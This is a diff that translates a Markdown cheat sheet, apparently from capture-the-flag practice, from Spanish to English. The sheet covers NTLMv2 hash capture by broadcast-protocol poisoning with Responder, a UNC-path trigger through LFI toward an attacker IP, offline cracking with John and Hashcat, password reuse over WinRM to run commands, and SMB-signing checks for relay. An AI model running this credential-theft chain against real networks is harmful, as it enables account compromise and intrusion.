@@ -2,82 +2,82 @@
 tags: [windows, cracking]
 ---
 
-> **NTLM (NT LAN Manager)** es un protocolo de autenticación challenge-response usado en entornos Windows. Esta guía cubre lo que hemos practicado: captura de hashes NTLMv2 con Responder y cracking con John the Ripper.
+> **NTLM (NT LAN Manager)** is a challenge-response authentication protocol used in Windows environments. This guide covers what we've practiced: capturing NTLMv2 hashes with Responder and cracking them with John the Ripper.
 
 ---
 
-## Quickstart — La cadena NTLM que hemos usado
+## Quickstart — The NTLM chain we've used
 
 ```bash
-# 1. Capturar NTLMv2 hash vía Responder
+# 1. Capture NTLMv2 hash via Responder
 sudo responder -I tun0
 
-# 2. Crackear el hash capturado
+# 2. Crack the captured hash
 john --format=netntlmv2 hash.txt
 
-# 3. Usar la contraseña para WinRM
+# 3. Use the password for WinRM
 netexec winrm 10.10.10.10 -u Administrator -p 'cracked_password' -x 'whoami'
 ```
 
 ---
 
-## NTLM Authentication — Cómo funciona
+## NTLM Authentication — How it works
 
-El protocolo challenge-response NTLM tiene 3 pasos:
+The NTLM challenge-response protocol has 3 steps:
 
-| Paso | Dirección | Qué ocurre |
+| Step | Direction | What happens |
 | :--- | :-------- | :--------- |
-| **1. Negotiate** | Client → Server | El cliente envía username y dominio |
-| **2. Challenge** | Server → Client | El servidor envía un challenge aleatorio de 8 bytes |
-| **3. Authenticate** | Client → Server | El cliente computa respuesta HMAC-MD5 usando su NT hash + challenge |
+| **1. Negotiate** | Client → Server | Client sends username and domain |
+| **2. Challenge** | Server → Client | Server sends a random 8-byte challenge |
+| **3. Authenticate** | Client → Server | Client computes HMAC-MD5 response using their NT hash + challenge |
 
-> 💡 **Key insight:** El servidor nunca ve la contraseña en texto plano — solo el challenge-response. Pero un atacante puede **capturar** este response con Responder y **crackearlo** offline.
+> 💡 **Key insight:** The server never sees the password in plaintext — only the challenge-response. But an attacker can **capture** this response with Responder and **crack it** offline.
 
 ### NTLMv1 vs NTLMv2
 
-| Característica | NTLMv1 | NTLMv2 |
+| Feature | NTLMv1 | NTLMv2 |
 | :------------- | :----- | :----- |
-| Fortaleza criptográfica | Roto (basado en DES) | HMAC-MD5 (más fuerte) |
-| Velocidad de cracking | Instantáneo | Minutos a horas |
+| Cryptographic strength | Broken (DES-based) | HMAC-MD5 (stronger) |
+| Cracking speed | Instant | Minutes to hours |
 | Hashcat mode | `-m 5500` | `-m 5600` |
 | John format | `netntlm` | `netntlmv2` |
-| Prevalencia en CTF | Raro (deprecado) | **El estándar** |
+| CTF prevalence | Rare (deprecated) | **The standard** |
 
 ---
 
-## Responder — Captura de hashes
+## Responder — Hash capture
 
-Responder envenena los protocolos de broadcast LLMNR, NBT-NS y mDNS para capturar hashes NTLM.
+Responder poisons LLMNR, NBT-NS, and mDNS broadcast protocols to capture NTLM hashes.
 
-### Uso básico
+### Basic usage
 
 ```bash
-# Iniciar Responder en tu interfaz VPN
+# Start Responder on your VPN interface
 $ sudo responder -I tun0
 
-# Modo análisis (pasivo — sin poisoning, solo monitorizar)
+# Analysis mode (passive — no poisoning, just monitor)
 $ sudo responder -I tun0 --analyze
 ```
 
-### Dónde se guardan los hashes capturados
+### Where captured hashes are saved
 
-Responder guarda las capturas en `/usr/share/responder/logs/`. Los hashes NTLMv2 están en archivos como `SMB-NTLMv2-*.txt`.
+Responder saves captures to `/usr/share/responder/logs/`. NTLMv2 hashes are in files like `SMB-NTLMv2-*.txt`.
 
-### Escenario CTF típico
+### Typical CTF scenario
 
 ```bash
-# 1. Iniciar Responder
+# 1. Start Responder
 $ sudo responder -I tun0
 
-# 2. Disparar autenticación NTLM desde el target (ej. vía UNC path en LFI)
+# 2. Trigger NTLM authentication from the target (e.g. via UNC path in LFI)
 #    http://target.htb/?page=\\10.10.14.5\file
 
-# 3. Responder captura:
+# 3. Responder captures:
 #    [SMB] NTLMv2-SSP Client   : 10.129.12.192
 #    [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
 #    [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f17dc1079a81:...
 
-# 4. Copiar el hash a un archivo y crackear:
+# 4. Copy the hash to a file and crack:
 $ john --format=netntlmv2 hash.txt
 ```
 
@@ -85,48 +85,48 @@ $ john --format=netntlmv2 hash.txt
 
 ## Hash Cracking — John the Ripper
 
-### Formato del hash NTLMv2
+### NTLMv2 hash format
 
 ```
 username::domain:ServerChallenge:NTProofStr:NTResponse
 ```
 
-Ejemplo:
+Example:
 ```
 admin::WORKGROUP:1122334455667788:a3b4c5d6e7f8091a2b3c4d5e6f708192:0101000000000000...
 ```
 
-### Crackear con John
+### Crack with John
 
 ```bash
 # NTLMv2
 $ john --format=netntlmv2 hash.txt
 
-# Con wordlist
+# With wordlist
 $ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
-# Ver resultados
+# Show results
 $ john --show hash.txt
 ```
 
-### Crackear con Hashcat
+### Crack with Hashcat
 
 ```bash
 # NTLMv2 (mode 5600)
 $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
-# Con reglas para mejor cobertura
+# With rules for better coverage
 $ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
 
 ---
 
-## SMB Signing — Por qué importa
+## SMB Signing — Why it matters
 
-SMB signing previene ataques de relay NTLM. Hay que verificarlo temprano.
+SMB signing prevents NTLM relay attacks. Check it early.
 
 ```bash
-# Verificar SMB signing con nmap
+# Check SMB signing with nmap
 nmap --script smb2-security-mode -p445 10.129.1.10
 # Output:
 # | smb2-security-mode:
@@ -134,13 +134,13 @@ nmap --script smb2-security-mode -p445 10.129.1.10
 # |_    Message signing enabled but not required    → ✅ relayable
 ```
 
-| Estado de Signing | Qué significa |
+| Signing State | What it means |
 | :---------------- | :------------ |
-| **Enabled but not required** | Se puede relayar hashes NTLM a este target |
-| **Required** | No se puede relayar — crackear el hash |
-| **Disabled** | Se puede relayar — común en workstations y Linux/Samba |
+| **Enabled but not required** | NTLM hashes can be relayed to this target |
+| **Required** | Cannot relay — crack the hash instead |
+| **Disabled** | Can relay — common on workstations and Linux/Samba |
 
-> 💡 **De HTB Dancing:** SMB signing estaba *"enabled but not required"* — la máquina era vulnerable a SMB relay si se hubieran capturado credenciales.
+> 💡 **From HTB Dancing:** SMB signing was *"enabled but not required"* — the machine was vulnerable to SMB relay if credentials had been captured.
 
 ---
 
